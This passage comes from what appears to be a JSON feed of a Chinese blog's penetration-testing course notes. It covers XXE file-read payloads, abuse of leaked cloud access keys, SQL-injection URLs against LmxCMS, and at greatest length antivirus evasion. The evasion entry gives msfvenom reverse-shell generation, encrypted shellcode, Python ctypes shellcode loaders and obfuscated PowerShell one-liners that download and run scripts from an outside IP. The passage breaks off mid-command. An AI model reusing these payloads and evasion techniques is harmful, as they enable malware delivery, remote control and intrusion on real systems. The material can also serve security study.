注入判断漏洞是否存在。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE Mikasa [</span><br><span class=\"line\">&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\">]&gt;</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"></span></span><br><span class=\"line\">&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-</span><br><span class=\"line\">    instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soapenv=&quot;http://schema</span><br><span class=\"line\">    s.xmlsoap.org/soap/envelope/&quot; xmlns:urn=&quot;urn:examples:usernameservice&quot;&gt;</span><br><span class=\"line\">&lt;soapenv:Header/&gt;</span><br><span class=\"line\">&lt;soapenv:Body&gt;</span><br><span class=\"line\">&lt;urn:Username soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;username xsi:type=&quot;xsd:string&quot;&gt;&amp;test;&lt;/username&gt;</span><br><span class=\"line\">&lt;/urn:Username&gt;</span><br><span class=\"line\">&lt;/soapenv:Body&gt;</span><br><span class=\"line\">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"app-接口分析\"><a class=\"markdownIt-Anchor\" href=\"#app-接口分析\">#</a> App 接口分析</h3>\n<p>用模拟器打开，流量代理到 burp，查看 app 上的按键及内容，翻阅 burp 的 历史请求，查看一些敏感的数据包。可以看到有大量的接口信息，并且得知网 站有 webpack，采用 PackFuzzer 进行网站 js 代码分析，在得到的文件中会展示 出所有的接口及影响程度。需要一个一个的寻找进行判断。发现所有与 admin 账户相关的数据包都不能正常访问，所以采用登录的方式访问，得到了更多信 息。继续分析 js 源码及 js 漏洞接口尝试获取更多信息。</p>\n<p>行云管家可以轻松管理云计算资源: <code>https://yun.cloudbility.com/login.html</code></p>\n<p>阿里云 accesskey 利用: <code>https://github.com/mrknow001/aliyun-accesskey-Tools</code></p>\n<p>接口配置文件泄漏导致云资源主机受控，拿到 accesskey 之后就可以直接控制云上的所有资源</p>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",
            "title": "XD22 8 代码审计",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"php-代码审计\"><a class=\"markdownIt-Anchor\" href=\"#php-代码审计\">#</a> php 代码审计</h3>\n<h4 id=\"php-sql注入\"><a class=\"markdownIt-Anchor\" href=\"#php-sql注入\">#</a> php sql 注入</h4>\n<p>1day 去敏 cnvd 漏洞复现：</p>\n<ul>\n<li>梦想 CMS 后台 Bo***.cl***.php 文件存在 SQL 注入漏洞</li>\n</ul>\n<p>漏洞说明:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY252ZC5vcmcuY24vZmxhdy9zaG93L0NOVkQtMjAyMC01OTQ2Ng==\">https://www.cnvd.org.cn/flaw/show/CNVD-2020-59466</span></p>\n<p><code>http://localhost:8081/lmxcms1.4/admin.php?m=book&amp;a=reply&amp;id=1)%20and% 20updatexml(0,concat(0x7e,user()),1)%23</code></p>\n<p>通过寻找到漏洞存在的文件，查找相关的 sql 注入，根据可输入的变量与变 量在代码中的执行流程来寻找，跟踪变量在代码中的行走轨迹，并进行过滤的 绕过，最后将数据库中执行的代码打印出来进行闭合并爆出敏感信息</p>\n<ul>\n<li>LmxCMS V1.4 前台 Ta***.cl***.php 存在 SQL 注入漏洞</li>\n</ul>\n<p>漏洞说明:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY252ZC5vcmcuY24vZmxhdy9zaG93L0NOVkQtMjAxOS0wNTY3NA==\">https://www.cnvd.org.cn/flaw/show/CNVD-2019-05674</span></p>\n<p>对比 1.4 与 1.41 文件代码不同更方便 - Beyond Compare 4</p>\n<p><code>http://localhost:8081/lmxcms1.4/?m=tags&amp;name=%25%36%31%25%32%37%25%.....</code></p>\n<p>进行新旧版本的对比之后，寻找更新的代码，用 beyond 工具可以很方便的，看出来被更新过的文件，通过更新来判断哪些漏洞被修复依次来判断出之前的 版本的漏洞的产生点。其次，此漏洞是因为用户的浏览器会自动进行一次 url 解 码，而前台的代码仍旧含有 urldecode 函数，导致用户编码两次的恶意 sql 注入 代码被执行。</p>\n<h4 id=\"php-文件操作\"><a class=\"markdownIt-Anchor\" href=\"#php-文件操作\">#</a> php 文件操作</h4>\n<ul>\n<li>文件读取</li>\n</ul>\n<p>有敏感的函数，是从敏感函数全局搜索跟踪变量，进行可控变量的寻找， 然后绕过相关过滤机制，进行任意文件读取的一种操作。</p>\n<ul>\n<li>文件下载</li>\n</ul>\n<p>从功能点挖掘，因为是没有文件下载对应函数的，抓包分析对应代码，看 下载的变量是否可以控制，追踪此变量所在的方法及最终被谁控制的，这个控 制此变量的因素是否能人为的修改，如果能够人为修改，是否有相应的过滤， 有过滤的话还需要绕过过滤；需要将网站界面代码和数据库统统对应上，分析 数据库中的数据来源及人为可控程度，进而依据此漏洞来读取敏感文件如数据 库配置文件。</p>\n<ul>\n<li>文件删除</li>\n</ul>\n<p>关键字挖掘 - 文件删除搜索关键字 unlink，对应函数 del_file，查看调用，后 台 delfile 函数调用，如何处理 delfile 函数，受参数控制，进行测试，构造 Payload - 确定过滤 - 重新构造 Payload - 配合重装机制实现重装漏洞。</p>\n<ul>\n<li>未授权漏洞配合文件删除</li>\n</ul>\n<p>代码执行逻辑问题，文件在后台被删除的时候虽然已经跳转到了登录界面，但是仍然可以继续执行此前的代码，导致恶意命令执行成功。</p>\n<h4 id=\"php-rce\"><a class=\"markdownIt-Anchor\" href=\"#php-rce\">#</a> php RCE</h4>\n<ul>\n<li>常见漏洞关键字</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如下</span></span><br><span class=\"line\">SQL注入：select insert update mysql_query mysqli等</span><br><span class=\"line\">文件上传：$_FILES，type=&quot;file&quot;，上传，move_uploaded_file()等</span><br><span class=\"line\">XSS跨站：print print_r echo sprintf die var_dump var_export等</span><br><span class=\"line\">文件包含：include include_once require require_once等</span><br><span class=\"line\">代码执行：eval assert preg_replace call_user_func call_user_func_array等</span><br><span class=\"line\">命令执行：system exec shell_exec `` passthru pcntl_exec popen proc_open</span><br><span class=\"line\">变量覆盖：extract() parse_str() importrequestvariables() $$ 等</span><br><span class=\"line\">反序列化：serialize() unserialize() __construct __destruct等</span><br><span class=\"line\">其他漏洞：unlink() file_get_contents() show_source() file() fopen()等</span><br></pre></td></tr></table></figure>\n<ul>\n<li>RCE 挖掘思路</li>\n</ul>\n<p>常规或部分 MVC 模型源码可以采用关键字的搜索挖掘思路。</p>\n<p>框架 MVC 源码一般会采用功能点分析抓包追踪挖掘思路，可能会把代码进 行封装，不在用原有的函数而是采用框架封装后的代码。</p>\n<p>依然是从函数出发，全局搜索出来可能执行系统命令的函数如 system，查 看是否有可控变量，进行追踪变量，判断是否能绕过相关过滤。</p>\n<ul>\n<li>linux 命令拼接</li>\n</ul>\n<p>通过 &amp; 或者 | 可以拼接命令，如果前边或者后边的语法有问题则会报错但是拼接另外一边的正确命令仍然会被执行，如 xxxx&amp;id&amp;1.txt 则会出现 id 的执行效果。</p>\n<h4 id=\"php反序列化\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化\">#</a> php 反序列化</h4>\n<ul>\n<li>自动审计或搜索关键字找到文件及代码段</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">寻找关键词unseriral()，找到之后判断魔术方法会执行到哪里，看是否能执行到魔术方法，进行构造，伪造参数绕过相关过滤。</span></span><br><span class=\"line\">__wakeup() //使用unserialize时触发</span><br><span class=\"line\">__sleep() //使用serialize时触发</span><br><span class=\"line\">__destruct() //对象被销毁时触发</span><br><span class=\"line\">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class=\"line\">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class=\"line\">__get() //用于从不可访问的属性读取数据</span><br><span class=\"line\">__set() //用于将数据写入不可访问的属性</span><br><span class=\"line\">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class=\"line\">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class=\"line\">__toString() //把类当作字符串使用时触发</span><br><span class=\"line\">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>\n<h3 id=\"tp代码审计\"><a class=\"markdownIt-Anchor\" href=\"#tp代码审计\">#</a> tp 代码审计</h3>\n<ul>\n<li>tp 框架漏洞挖掘</li>\n</ul>\n<p>一般分为 1day 和 0day，1day 的话是网络上已经确定了有此版本对应框架的 漏洞，但是未公开处来 poc，在 github 上也能搜索到安全更新等关键词，可以拿 到新更新的源码和之前的版本用 beyond 版本进行对比，审计 1day 代码审计， 获取 1day 的 exp。</p>\n<p>主要还是查代码，走流程，看功能或者特定函数，看过滤，判断能否绕过，打断点，追踪数据流，对应 url 地址与代码端进行漏洞的挖掘。框架 0day 就别 想了，太难了，可以对照搞几个 1day 尝试一下。</p>\n<ul>\n<li>利用官方更新说明探针</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RvcC10aGluay9mcmFtZXdvcms=\">https://github.com/top-think/framework</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vY2hhenovVGhpbmtQSFAtVnVsbg==\">https://github.com/Mochazz/ThinkPHP-Vuln</span></p>\n<h3 id=\"net代码审计\"><a class=\"markdownIt-Anchor\" href=\"#net代码审计\">#</a> net 代码审计</h3>\n<p>asp.net 可以用 C# ，<span class=\"exturl\" data-url=\"aHR0cDovL1ZCLk5FVA==\">VB.NET</span> ，Jscript.net 等等来开发，但是通常首选都是 C#<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1WQi1peTZjLk5FVA==\">和 VB.NET</span>，审计 asp.net 的时候，首先得弄明白他的结构，他并不像 php 那么单纯。在 asp.net 应用中，需要进行观察的文件有：.aspx，.cs，.ashx，dll。</p>\n<p>.aspx 是页面后的代码，aspx 负责显示，服务器端的动作就是在.cs 定义的<br>\n.cs 是类文件，里边是程序和函数<br>\n.ashx 是一般处理程序，主要用于写 web handler, 可以理解成不会显示的 aspx 页面<br>\n.dll 就是 cs 文件编译之后的程序集</p>\n<h3 id=\"java代码审计没听\"><a class=\"markdownIt-Anchor\" href=\"#java代码审计没听\">#</a> java 代码审计（没听）</h3>\n<p>没听懂，我日他妈，真他妈难</p>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/",
            "title": "XD22 10 免杀对抗",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"源码层面免杀\"><a class=\"markdownIt-Anchor\" href=\"#源码层面免杀\">#</a> 源码层面免杀</h3>\n<h4 id=\"c免杀\"><a class=\"markdownIt-Anchor\" href=\"#c免杀\">#</a> c 免杀</h4>\n<ul>\n<li>木马生成</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">cs/msf 木马</span></span><br><span class=\"line\"><span class=\"meta prompt_\">cs-&gt;</span><span class=\"language-bash\">攻击-&gt;生成后门-&gt;payload生成windows可执行程序-&gt;选择监听器-&gt;生成</span></span><br><span class=\"line\"><span class=\"meta prompt_\">msf-&gt; </span><span class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x lport=8079 -f c</span></span><br><span class=\"line\"><span class=\"meta prompt_\">msf-&gt; </span><span class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b <span class=\"string\">&#x27;\\x00&#x27;</span> lhost=47.102.120.55 lport=8079 -f raw &gt; shellcode.raw</span></span><br><span class=\"line\">msf监听-&gt; use exploit/multi/handler</span><br></pre></td></tr></table></figure>\n<ul>\n<li>木马免杀</li>\n</ul>\n<p>用 windows 将 c 文件编译为 exe 文件运行，c 文件可操作空间更大，而不像 exe 程序，直接是程序，修改之后可能失去了木马作用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">xor加密:工具或自定义脚本</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工具下载：https://github.com/Arno0x/ShellcodeWrapper</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用密钥“thisismykey ”对 shellcode 进行异或加密</span></span><br><span class=\"line\">python2 shellcode_encoder.py -cpp -cs -py shellcode.raw thisismykey xor</span><br><span class=\"line\">python xor.py -s shellcode.bin -d payload.c -n 10 -r out.bin</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">aes加密</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用密钥“thisismykey ”对 shellcode 进行aes加密</span></span><br><span class=\"line\">python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成的cpp文件需要用gcc编译器进行编译成可执行文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hex加密</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工具下载：https://github.com/ByPassAVTeam/ShellcodeLoader</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在线编码：https://gchq.github.io/CyberChef/</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将 16 进制的payload生成exe可执行程序：</span></span><br><span class=\"line\">LoaderMaker.exe download.dat xiaodi.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">rc4 加密:https://blog.csdn.net/weixin_45590789/article/details/105536623</span></span><br><span class=\"line\">将shellcode经过rc4 加密，再进行利用</span><br></pre></td></tr></table></figure>\n<ul>\n<li>免杀结论</li>\n</ul>\n<p>经测试，只有 rc4 加密绕过了 windows Defender，而 360 没有被这几种方法绕过，自己写的 xor 加密，aes 加密，hex 加密，rc4 加密都很大程度上绕过了火 绒。每次木马执行完毕后，需要清理，防止指纹被采集，下次就不是很好使用了。</p>\n<h4 id=\"py免杀\"><a class=\"markdownIt-Anchor\" href=\"#py免杀\">#</a> py 免杀</h4>\n<ul>\n<li>py 执行木马的代码</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行代码 1</span> </span><br><span class=\"line\">shellcode = b&quot;xxxxx&quot;</span><br><span class=\"line\">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)</span><br><span class=\"line\">ctypes.windll.kernel32.RtlMoveMemory(rwxpage,</span><br><span class=\"line\">ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class=\"line\">handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)</span><br><span class=\"line\">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行代码 2</span> </span><br><span class=\"line\">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class=\"line\">ctypes.c_int(len(shellcode)),</span><br><span class=\"line\">ctypes.c_int(0x3000),</span><br><span class=\"line\">ctypes.c_int(0x40))</span><br><span class=\"line\">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class=\"line\">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class=\"line\">buf,</span><br><span class=\"line\">ctypes.c_int(len(shellcode)))</span><br><span class=\"line\">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class=\"line\">ctypes.c_int(0),</span><br><span class=\"line\">ctypes.c_int(ptr),</span><br><span class=\"line\">ctypes.c_int(0),</span><br><span class=\"line\">ctypes.c_int(0),</span><br><span class=\"line\">ctypes.pointer(ctypes.c_int(0)))</span><br><span class=\"line\">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>\n<ul>\n<li>混淆加密免杀</li>\n</ul>\n<p>（ 1 ）正常情况 直接执行<br>\n（ 2 ）base 64 先编码，在进行解码操作，后者为新木马<br>\n（ 3 ）aes+base64:msf 生成 base 64 编码木马，对木马 aes 加密，而后将 aes 解密操作变成可执行<br>\n（ 4 ）序列化与反序列化<br>\n（ 5 ）另外的 Xor，Rc4 等加密算法都可以实现测试</p>\n<ul>\n<li>不同的打包器打包木马</li>\n</ul>\n<p>对上述 5 种方法产生的木马进行打包</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">pyinstaller 使用</span></span><br><span class=\"line\">pyinstaller -F test.py</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">py2exe 打包</span></span><br><span class=\"line\">python setup.py py2exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Nuitka 使用</span></span><br><span class=\"line\">nuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-import-to=utils,src --output-dir=out 108.py</span><br></pre></td></tr></table></figure>\n<h4 id=\"ps1-免杀\"><a class=\"markdownIt-Anchor\" href=\"#ps1-免杀\">#</a> ps1 免杀</h4>\n<p>cs 可以生成 powershell 文件和 powershell command 两种。第一种是文件模式，上线代码在 ps 1 种，直接运行就可以上线，第二种是一个 txt，复制代码用 cmd 执行即可上线。</p>\n<ul>\n<li>手工混淆</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">先base 64 编码再去执行解码后的代码</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">bb=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(<span class=\"variable\">$x</span>))</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">powershell绕过执行策略执行ps1 脚本的方法</span></span><br><span class=\"line\">powershell -ExecutionPolicy bypass -File hr.ps1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在编码后的代码中添加一些垃圾数据，进行replace替换为空，解码执行</span></span><br><span class=\"line\">- -----xiaosedi------xiaosedi-----xiaosedi------------.replace(&#x27;xiaosedi&#x27;,&#x27;&#x27;)</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在原型代码中添加一些垃圾数据，编码解码之后，进行replace替换为空，干扰检测。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>分离代码</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将恶意代码的base 64 藏在web上，通过http请求去拿数据，再通过解码执行</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">d= ((New-Object System.Net.Webclient).DownloadString(&#x27;http://x.x.x.x/<span class=\"number\">1</span>.txt&#x27;))</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">x=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class=\"variable\">$d</span>))</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可以配合手工混淆，将原型或编码后的代码加上干扰数据后放至远程http上</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>项目混淆</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/danielbohannon/Invoke-Obfuscation</span><br><span class=\"line\">加载模块：Import-Module ./Invoke-Obfuscation.psd1</span><br><span class=\"line\">运行程序：Invoke-Obfuscation</span><br><span class=\"line\">原型文件路径：set scriptpath C:\\Users\\ 86135 \\Desktop\\1.ps1</span><br><span class=\"line\">部分代码编码：set scriptblock &#x27;xxxx&#x27;</span><br><span class=\"line\">进入编码：encoding</span><br><span class=\"line\">选择编码： 1 - 8</span><br><span class=\"line\">输出文件：out C:\\Users\\ 86135 \\Desktop\\11.ps1</span><br></pre></td></tr></table></figure>\n<ul>\n<li>木马转字节流 特征修改</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找到关键木马，利用脚本将木马的核心代码转化为字节流，注意字节流不能加引号</span></span><br><span class=\"line\"><span class=\"meta prompt_\">[Byte[]]$</span><span class=\"language-bash\">x=[Byte[]](1,23,315,124,......,2512)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将shellcode中的全部的代码进行变量替换，使其与原型发生很大不同</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">即通过fuzz的思想，看修改哪部分代码是defender检测的进行修改</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"ps1-cmd-免杀\"><a class=\"markdownIt-Anchor\" href=\"#ps1-cmd-免杀\">#</a> ps1 cmd 免杀</h4>\n<ul>\n<li>执行远程原型木马</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行远程原型木马</span></span><br><span class=\"line\">powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/x.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>替换变量</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">替换变量</span></span><br><span class=\"line\">powershell &quot;$a=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;$b=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX ($a+$b)&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">复制powershell执行程序</span> </span><br><span class=\"line\">copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe bypass.exe</span><br><span class=\"line\">.\\bypass.exe &quot;$a=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;$b=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX ($a+$b)&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>垃圾数据干扰</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">垃圾数据干扰</span></span><br><span class=\"line\">powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal - w Normal -w Normal -w Normal -w Normal -w Normal -w Normal ...... Nor mal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).Downl oadString(&#x27;ht&#x27;+&#x27;tp://47.94.236.117/x.ps1&#x27;)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>替换原型木马关键字进行干扰</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">替换原型木马关键字进行干扰</span></span><br><span class=\"line\">powershell -NoExit &quot;$c1=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;$c2=&#x27;123(&#x27;&#x27;http://47.94.236.117/x.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX 